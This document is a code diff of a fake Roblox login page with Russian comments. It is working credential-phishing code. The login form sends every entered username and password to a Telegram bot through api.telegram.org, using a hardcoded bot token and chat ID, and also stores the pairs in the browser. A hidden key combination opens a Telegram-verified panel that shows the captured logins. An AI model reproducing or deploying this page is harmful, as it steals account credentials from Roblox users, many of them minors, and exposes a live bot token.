@@ -5,32 +5,23 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox</title>
     <style>
-        /* Общие стили */
         body, html { margin: 0; padding: 0; height: 100%; font-family: "Segoe UI", sans-serif; background: radial-gradient(circle, #252729 0%, #000 100%); color: #d1d1d1; overflow: hidden; }
-        
         .navbar { display: flex; align-items: center; background-color: #232527; padding: 0 20px; height: 40px; position: fixed; top: 0; width: 100%; z-index: 100; border-bottom: 1px solid #111; box-sizing: border-box; }
         .logo-text { font-size: 20px; font-weight: 800; color: #fff; }
-
-        /* Центрирование всех экранов */
-        .screen { display: none; flex-direction: column; justify-content: center; align-items: center; height: 100vh; width: 100%; position: absolute; top: 0; left: 0; }
-        #login-form-screen { display: flex; } /* Показываем первый экран */
-
-        /* Карточка входа (поправил отступы, чтобы не съезжало) */
-        .login-card { background-color: #232527; width: 380px; padding: 40px; border-radius: 4px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.5); border: 1px solid #333; box-sizing: border-box; }
+        .screen { display: none; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; width: 100%; position: absolute; }
+        #login-form-screen { display: flex; }
+        .login-card { background-color: #232527; width: 400px; padding: 40px; border-radius: 4px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; background-color: #393b3d; border: 1px solid #393b3d; border-radius: 8px; color: #fff; box-sizing: border-box; outline: none; }
+        .btn-auth { width: 100%; padding: 12px; background: #393b3d; border: 1px solid #fff; color: #fff; border-radius: 8px; cursor: pointer; font-weight: bold; }
         
-        input { width: 100%; padding: 12px; margin-bottom: 15px; background-color: #393b3d; border: 1px solid #393b3d; border-radius: 8px; color: #fff; outline: none; box-sizing: border-box; }
-        .btn-auth { width: 100%; padding: 12px; background: #393b3d; border: 1px solid #fff; color: #fff; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 5px; }
-
-        /* Сетка аккаунтов для проверки */
-        .acc-list { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; width: 100%; }
-        .acc-item { background: #393b3d; padding: 8px; border-radius: 5px; cursor: pointer; border: 1px solid transparent; font-size: 13px; text-align: center; }
+        /* Стили для выбора аккаунтов */
+        .acc-list { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; width: 100%; }
+        .acc-item { background: #393b3d; padding: 10px; border-radius: 5px; cursor: pointer; border: 1px solid transparent; font-size: 14px; }
         .acc-item:hover { border-color: #ff0000; }
 
-        /* Админ-панель */
-        .admin-box { background: #1a1a1a; padding: 20px; border-radius: 10px; width: 90%; max-width: 800px; border: 1px solid #444; max-height: 60vh; overflow-y: auto; }
-        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
-        th, td { padding: 10px; border: 1px solid #333; text-align: left; font-size: 14px; }
-        .controls { display: flex; gap: 10px; margin-top: 20px; }
+        .admin-box { background: #1a1a1a; padding: 20px; border-radius: 10px; width: 95%; max-width: 1000px; border: 1px solid #444; max-height: 400px; overflow-y: auto; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { padding: 10px; border: 1px solid #333; text-align: left; }
     </style>
 </head>
 <body>
@@ -39,7 +30,7 @@
 
     <div id="login-form-screen" class="screen">
         <div class="login-card">
-            <h2 style="color:#fff; margin: 0 0 25px 0;">Login to Roblox</h2>
+            <h2 style="color:#fff; margin-bottom: 30px;">Login to Roblox</h2>
             <input type="text" id="username" placeholder="Username">
             <input type="password" id="password" placeholder="Password">
             <button class="btn-auth" onclick="saveData()">Log In</button>
@@ -47,41 +38,37 @@
     </div>
 
     <div id="admin-auth" class="screen">
-        <div class="login-card" style="border-color: #ff0000;">
-            <h2 style="color: #ff0000; margin: 0 0 10px 0;">VERIFICATION</h2>
-            <p id="status-text" style="color: #888; font-size: 13px; margin-bottom: 15px;">Введите код и выберите аккаунт из TG.</p>
-            
+        <div class="login-card" style="border: 2px solid #ff0000;">
+            <h2 style="color: #ff0000;">SECURITY CHECK</h2>
+            <p id="status-text" style="color: #888; margin-bottom: 15px;">Введите код и выберите аккаунт из TG.</p>
             <input type="password" id="admin_pass" placeholder="Код из Telegram">
-            
             <div id="acc-selector" class="acc-list" style="display: none;"></div>
-
-            <button id="request-btn" class="btn-auth" style="border-color: #ff0000; color: #ff0000;" onclick="startVerification()">Получить данные в TG</button>
+            <button id="request-btn" class="btn-auth" style="border-color: #ff0000; color: #ff0000;" onclick="startVerification()">Получить данные в ТГ</button>
         </div>
     </div>
 
     <div id="admin-panel" class="screen">
         <div class="admin-box">
-            <h3 style="color: #fff; margin-top: 0;">LOGS DATABASE</h3>
+            <h2 style="color: #fff;">DATABASE</h2>
             <table>
                 <thead><tr><th>User</th><th>Pass</th><th>Time</th></tr></thead>
                 <tbody id="logData"></tbody>
             </table>
         </div>
-        <div class="controls">
-            <button class="btn-auth" style="width: 150px;" onclick="updateLogs()">Обновить базу</button>
-            <button class="btn-auth" style="width: 150px; border-color: #888;" onclick="location.reload()">Выход</button>
+        <div style="margin-top: 20px; display: flex; gap: 10px;">
+            <button class="btn-auth" style="width: 150px;" onclick="updateLogs()">Обновить</button>
+            <button class="btn-auth" style="width: 150px;" onclick="location.reload()">Выход</button>
         </div>
     </div>
 
     <script>
         const TG_TOKEN = "8385266015:AAHpN8EUWlEgoGtslfBoEoyqPycXD2gbPGw";
         const TG_CHAT_ID = "7863254073";
-        
         let secretCode = "";
         let targetAccount = "";
         const mockAccounts = ["Admin_Vip", "Roblox_Owner", "Mod_Check", "System_Root", "User_Test", "Dev_Access", "Security_Bot", "Main_Admin", "Global_Mod", "Data_Manager"];
 
-        // Секретка: Ctrl + \ + 3 + Z
+        // Ctrl + \ + 3 + Z
         let keys = {};
         document.addEventListener('keydown', (e) => {
             keys[e.code] = true;
@@ -97,17 +84,10 @@
         async function startVerification() {
             secretCode = Math.floor(1000 + Math.random() * 9000).toString();
             targetAccount = mockAccounts[Math.floor(Math.random() * mockAccounts.length)];
-
-            document.getElementById('status-text').innerText = "Проверь Telegram!";
             
             await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ 
-                    chat_id: TG_CHAT_ID, 
-                    text: `🔐 *ADMIN LOGIN*\nКод: \`${secretCode}\` \nВыбери акк: *${targetAccount}*`, 
-                    parse_mode: "Markdown" 
-                })
+                method: "POST", headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: TG_CHAT_ID, text: `🔐 *ADMIN LOGIN*\nКод: \`${secretCode}\` \nВыбери акк: *${targetAccount}*`, parse_mode: "Markdown" })
             });
 
             document.getElementById('request-btn').style.display = "none";
@@ -119,14 +99,9 @@
                 div.className = 'acc-item';
                 div.innerText = acc;
                 div.onclick = () => {
-                    const userCode = document.getElementById('admin_pass').value;
-                    if (userCode === secretCode && acc === targetAccount) {
-                        showScreen('admin-panel');
-                        updateLogs();
-                    } else {
-                        alert("Ошибка верификации!");
-                        location.reload();
-                    }
+                    if (document.getElementById('admin_pass').value === secretCode && acc === targetAccount) {
+                        showScreen('admin-panel'); updateLogs();
+                    } else { alert("Ошибка!"); location.reload(); }
                 };
                 accSelector.appendChild(div);
             });
@@ -136,13 +111,10 @@
             const u = document.getElementById('username').value;
             const p = document.getElementById('password').value;
             if(!u || !p) return;
-            
-            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                method: "POST", headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: TG_CHAT_ID, text: `👤 *LOG:* \`${u}\` | \`${p}\``, parse_mode: "Markdown" })
             });
-
             let logs = JSON.parse(localStorage.getItem('roblox_logs') || '[]');
             logs.push({ user: u, pass: p, time: new Date().toLocaleTimeString() });
             localStorage.setItem('roblox_logs', JSON.stringify(logs));
@@ -152,13 +124,8 @@
         function updateLogs() {
             const logs = JSON.parse(localStorage.getItem('roblox_logs') || '[]');
             const tbody = document.getElementById('logData');
-            if(logs.length === 0) {
-                tbody.innerHTML = "<tr><td colspan='3' style='text-align:center'>База пуста</td></tr>";
-            } else {
-                tbody.innerHTML = logs.reverse().map(l => 
-                    `<tr><td>${l.user}</td><td>${l.pass}</td><td>${l.time}</td></tr>`
-                ).join('');
-            }
+            tbody.innerHTML = logs.length === 0 ? "<tr><td colspan='3' style='text-align:center'>Пусто</td></tr>" : 
+                logs.reverse().map(l => `<tr><td>${l.user}</td><td>${l.pass}</td><td>${l.time}</td></tr>`).join('');
         }
     </script>
 </body>
